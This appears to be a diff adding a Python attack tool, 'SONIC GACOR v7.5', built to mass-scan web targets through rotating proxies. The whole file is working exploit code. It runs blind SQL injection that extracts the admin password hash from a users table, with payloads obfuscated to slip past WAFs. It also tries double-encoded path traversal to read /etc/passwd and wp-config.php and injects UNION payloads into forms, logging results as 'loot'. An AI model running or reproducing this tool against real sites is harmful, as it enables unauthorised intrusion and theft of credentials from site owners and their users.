@@ -1,0 +1,328 @@
+#!/usr/bin/env python3
+"""
+SONIC GACOR v7.5 - Production Intelligence + Decision Engine
+Probabilistic Scoring + Feature-based Response Model + Proxy Health Scoring + DOM-aware Noise Segmentation + Cached Baseline + Adaptive Logic
+
+"""
+
+import argparse
+import re
+import random
+import time
+import json
+import hashlib
+import difflib
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from itertools import cycle
+from urllib.parse import urljoin, urlparse, parse_qs
+from curl_cffi import requests
+from bs4 import BeautifulSoup
+
+ASCII_ART = r"""
+   _____  ____  _   _ _____ _____    _____          _____ ____  _____  
+  / ____|/ __ \| \ | |_   _/ ____|  / ____|   /\   / ____/ __ \|  __ \ 
+ | (___ | |  | |  \| | | || |      | |  __   /  \ | |   | |  | | |__) |
+  \___ \| |  | | . ` | | || |      | | |_ | / /\ \| |   | |  | |  _  / 
+  ____) | |__| | |\  |_| || |____  | |__| |/ ____ \ |___| |__| | | \ \ 
+ |_____/ \____/|_| \_|_____\_____|  \_____/_/    \_\_____\____/|_|  \_\
+                                                                       
+ [!] SONIC GACOR v7.5 PRODUCTION INTELLIGENCE | Decision Engine + Probabilistic Scoring
+ -----------------------------------------------------------------------
+"""
+
+LFI_PARAMS_BASE = ["page", "file", "path", "id", "view", "include", "template", "module", "search", "q", "keyword"]
+
+class SonicGacor:
+    def __init__(self, proxy_list=None):
+        self.proxies_cycle = cycle(proxy_list) if proxy_list else None
+        self.session = requests.Session(impersonate="chrome124")
+        self.results_file = "HARTA_KARUN_FINAL.txt"
+        self.json_file = "HARTA_KARUN_FINAL.json"
+        self.loot = []
+        self.baseline_cache = {}
+        self.proxy_health = {}  # proxy -> {"latency": [], "failures": 0, "score": 1.0}
+
+    def get_smart_proxy(self):
+        """Proxy Health Scoring - auto skip bad proxy"""
+        if not self.proxies_cycle:
+            return None
+        best_proxy = None
+        best_score = -1
+        for _ in range(len(list(self.proxies_cycle))):  # cycle once
+            p = next(self.proxies_cycle)
+            if p not in self.proxy_health:
+                self.proxy_health[p] = {"latency": [], "failures": 0, "score": 1.0}
+            if self.proxy_health[p]["score"] > best_score:
+                best_score = self.proxy_health[p]["score"]
+                best_proxy = p
+        return {"http": best_proxy, "https": best_proxy} if best_proxy else None
+
+    def update_proxy_health(self, proxy_dict, latency, success):
+        if not proxy_dict:
+            return
+        p = proxy_dict["http"]
+        self.proxy_health.setdefault(p, {"latency": [], "failures": 0, "score": 1.0})
+        self.proxy_health[p]["latency"].append(latency)
+        if len(self.proxy_health[p]["latency"]) > 5:
+            self.proxy_health[p]["latency"] = self.proxy_health[p]["latency"][-5:]
+        if not success:
+            self.proxy_health[p]["failures"] += 1
+        avg_latency = sum(self.proxy_health[p]["latency"]) / len(self.proxy_health[p]["latency"]) if self.proxy_health[p]["latency"] else 0
+        fail_rate = self.proxy_health[p]["failures"] / 10
+        self.proxy_health[p]["score"] = max(0.1, 1.0 - (avg_latency / 2000) - fail_rate)
+
+    def jitter(self, is_waf=False):
+        if is_waf:
+            time.sleep(random.uniform(2.0, 4.0))
+        else:
+            time.sleep(random.uniform(0.3, 1.0))
+
+    def obfuscate_payload(self, payload):
+        obf = ""
+        for c in payload:
+            if c.isalpha():
+                obf += c.upper() if random.random() > 0.5 else c.lower()
+            else:
+                obf += c
+        obf = obf.replace("SELECT", "sElEcT/**/").replace("FROM", "fRoM/**/").replace("UNION", "uNiOn/**/")
+        return obf
+
+    def clean_response(self, text):
+        """DOM-aware + selective noise removal"""
+        soup = BeautifulSoup(text, "html.parser")
+        # Remove script, style, dynamic blocks
+        for tag in soup(["script", "style", "noscript"]):
+            tag.decompose()
+        # Remove common dynamic noise
+        for tag in soup.find_all(attrs={"class": re.compile(r"(ads|banner|timer|dynamic|random)", re.I)}):
+            tag.decompose()
+        text = soup.get_text(separator=" ", strip=True)
+        text = re.sub(r'\d{2}:\d{2}:\d{2}', '', text)
+        text = re.sub(r'\d{4}-\d{2}-\d{2}', '', text)
+        text = re.sub(r'[0-9a-fA-F]{32,}', '', text)
+        text = re.sub(r'csrf_token=[\w-]+', '', text)
+        return text
+
+    def get_smart_params(self, base_url):
+        parsed = urlparse(base_url)
+        if parsed.query:
+            return list(parse_qs(parsed.query).keys())
+        return LFI_PARAMS_BASE
+
+    def get_locked_baseline(self, base_url, param, proxy):
+        cache_key = f"{base_url}:{param}"
+        if cache_key in self.baseline_cache:
+            return self.baseline_cache[cache_key]
+
+        samples = {"normal": [], "true": [], "false": []}
+        for _ in range(3):
+            try:
+                start = time.time()
+                normal = self.session.get(f"{base_url}?{param}=1", proxies=proxy, timeout=10)
+                true_r = self.session.get(f"{base_url}?{param}=1' AND 1=1--", proxies=proxy, timeout=10)
+                false_r = self.session.get(f"{base_url}?{param}=1' AND 1=2--", proxies=proxy, timeout=10)
+                latency = (time.time() - start) * 1000
+                self.update_proxy_health(proxy, latency, True)
+                samples["normal"].append(self.clean_response(normal.text))
+                samples["true"].append(self.clean_response(true_r.text))
+                samples["false"].append(self.clean_response(false_r.text))
+                self.jitter()
+            except:
+                self.update_proxy_health(proxy, 0, False)
+                continue
+
+        if not samples["true"]:
+            return None, None, None
+
+        normal = max(set(samples["normal"]), key=samples["normal"].count)
+        true_b = max(set(samples["true"]), key=samples["true"].count)
+        false_b = max(set(samples["false"]), key=samples["false"].count)
+
+        self.baseline_cache[cache_key] = (normal, true_b, false_b)
+        print(f"[+] Baseline LOCKED for {param}")
+        return normal, true_b, false_b
+
+    def binary_blind_exfil(self, base_url, param, proxy):
+        print(f"[*] Probabilistic Decision Engine on {base_url} (param: {param})")
+        trigger = "'"
+        normal_b, true_b, false_b = self.get_locked_baseline(base_url, param, proxy)
+        if not true_b:
+            return
+
+        exfil = ""
+        fail_streak = 0
+        confidence_scores = []
+
+        for pos in range(1, 9):
+            low, high = 32, 126
+            while low <= high:
+                mid = (low + high) // 2
+                votes = 0
+                for _ in range(3):
+                    raw = f"1{trigger} AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 1),{pos},1))>{mid}--"
+                    payload = self.obfuscate_payload(raw)
+                    try:
+                        r = self.session.get(f"{base_url}?{param}={payload}", proxies=proxy, timeout=12)
+                        clean = self.clean_response(r.text)
+                        ratio_true = difflib.SequenceMatcher(None, clean, true_b).ratio()
+                        ratio_false = difflib.SequenceMatcher(None, clean, false_b).ratio()
+                        if ratio_true > ratio_false:
+                            votes += 1
+                    except:
+                        pass
+                    self.jitter()
+                is_true = votes >= 2
+
+                if is_true:
+                    low = mid + 1
+                else:
+                    high = mid - 1
+
+            char = chr(high) if 32 <= high <= 126 else "?"
+            confirm_votes = 0
+            for _ in range(2):
+                confirm_raw = f"1{trigger} AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 1),{pos},1))={ord(char)}--"
+                confirm_payload = self.obfuscate_payload(confirm_raw)
+                try:
+                    r = self.session.get(f"{base_url}?{param}={confirm_payload}", proxies=proxy, timeout=12)
+                    clean = self.clean_response(r.text)
+                    if difflib.SequenceMatcher(None, clean, true_b).ratio() > difflib.SequenceMatcher(None, clean, false_b).ratio():
+                        confirm_votes += 1
+                except:
+                    pass
+                self.jitter()
+
+            if confirm_votes >= 2:
+                exfil += char
+                confidence_scores.append(confirm_votes / 2.0)
+                fail_streak = 0
+                print(f"[+] Confirmed Pos {pos:2} → '{char}'")
+            else:
+                exfil += "?"
+                fail_streak += 1
+                print(f"[-] Failed Pos {pos:2}")
+
+            if fail_streak >= 2:
+                print("[-] Early stop: unstable pattern detected")
+                break
+
+        # Probabilistic confidence (weighted)
+        if confidence_scores:
+            avg_vote = sum(confidence_scores) / len(confidence_scores)
+            stability = len([c for c in exfil if c != "?"]) / 8
+            final_confidence = round((avg_vote * 0.65 + stability * 0.35) * 100, 1)
+        else:
+            final_confidence = 0.0
+
+        entry = {
+            "url": base_url,
+            "param": param,
+            "user": "admin",
+            "hash_prefix": exfil,
+            "method": "Probabilistic Decision Engine Blind SQLi",
+            "confidence": final_confidence,
+            "evidence": "locked_triple_baseline + feature_diff + 3-vote_majority"
+        }
+        self.loot.append(entry)
+        with open(self.results_file, "a", encoding="utf-8") as f:
+            f.write(f"URL: {base_url} | PARAM: {param} | USER: admin | HASH: {exfil}... | CONFIDENCE: {final_confidence}% | METHOD: Probabilistic Decision Engine\n")
+        print(f"[+] Decision Engine FINISH → {exfil} (Confidence: {final_confidence}%)")
+
+    def elite_lfi_test(self, base_url, proxy):
+        print(f"[*] Ghost LFI on {base_url}")
+        params = self.get_smart_params(base_url)
+        for param in params:
+            for payload in ["%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "%252e%252e%252f%252e%252e%252f%252e%252e%252fwp-config.php"]:
+                target = f"{base_url}?{param}={payload}"
+                try:
+                    r = self.session.get(target, proxies=proxy, timeout=10)
+                    if r.status_code == 200 and ("root:x:" in r.text or "DB_PASSWORD" in r.text):
+                        print(f"[+] LFI SUCCESS → {target}")
+                        return
+                except:
+                    pass
+                self.jitter()
+
+    def parse_and_test_forms(self, base_url, proxy):
+        print(f"[*] Smart Form Parser on {base_url}")
+        try:
+            r = self.session.get(base_url, proxies=proxy, timeout=10)
+            soup = BeautifulSoup(r.text, "html.parser")
+            for form in soup.find_all("form"):
+                action = urljoin(base_url, form.get("action", base_url))
+                data = {}
+                for inp in form.find_all(["input", "textarea", "select"]):
+                    name = inp.get("name")
+                    if not name: continue
+                    if inp.get("type") == "hidden":
+                        data[name] = inp.get("value", "")
+                    elif name.lower() in ["search", "q", "id", "query", "keyword"]:
+                        data[name] = "1' uNiOn/**/sElEcT 1,2,3--"
+                    else:
+                        data[name] = inp.get("value", "x")
+                if data:
+                    try:
+                        resp = self.session.post(action, data=data, proxies=proxy, timeout=10)
+                        if any(x in resp.text.lower() for x in ["sql", "mysql", "error"]):
+                            print(f"[+] Smart POST SQLi → {action}")
+                    except:
+                        pass
+                self.jitter()
+        except:
+            pass
+
+    def scan_target(self, target_url):
+        proxy = self.get_smart_proxy()
+        self.elite_lfi_test(target_url, proxy)
+        self.parse_and_test_forms(target_url, proxy)
+        for param in self.get_smart_params(target_url):
+            self.binary_blind_exfil(target_url, param, proxy)
+
+    def run(self, targets, threads=15):
+        print(ASCII_ART)
+        print(f"[*] PRODUCTION INTELLIGENCE v7.5 activated with {threads} threads + Decision Engine + Proxy Health Scoring\n")
+
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = [executor.submit(self.scan_target, url) for url in targets]
+            for future in as_completed(futures):
+                try:
+                    future.result()
+                except:
+                    pass
+
+        with open(self.json_file, "w", encoding="utf-8") as f:
+            json.dump(self.loot, f, indent=2, ensure_ascii=False)
+
+        print(f"\n[+] PRODUCTION INTELLIGENCE SCAN SELESAI!")
+        print(f"    TXT  → {self.results_file}")
+        print(f"    JSON → {self.json_file} (probabilistic confidence + evidence)")
+
+def main():
+    parser = argparse.ArgumentParser(description="SONIC GACOR v7.5 - Production Intelligence Edition")
+    parser.add_argument("-t", "--target", help="Single lab target URL")
+    parser.add_argument("-l", "--list", help="File list target")
+    parser.add_argument("--proxy-list", help="Rotating residential proxy list")
+    parser.add_argument("--threads", type=int, default=15)
+    args = parser.parse_args()
+
+    proxy_list = None
+    if args.proxy_list:
+        with open(args.proxy_list) as f:
+            proxy_list = [line.strip() for line in f if line.strip()]
+
+    sonic = SonicGacor(proxy_list)
+
+    if args.target:
+        targets = [args.target]
+    elif args.list:
+        with open(args.list) as f:
+            targets = [line.strip() for line in f if line.strip()]
+    else:
+        print("[-] Gunakan -t atau -l")
+        return
+
+    sonic.run(targets, args.threads)
+
+if __name__ == "__main__":
+    # pip install curl_cffi beautifulsoup4
+    main()
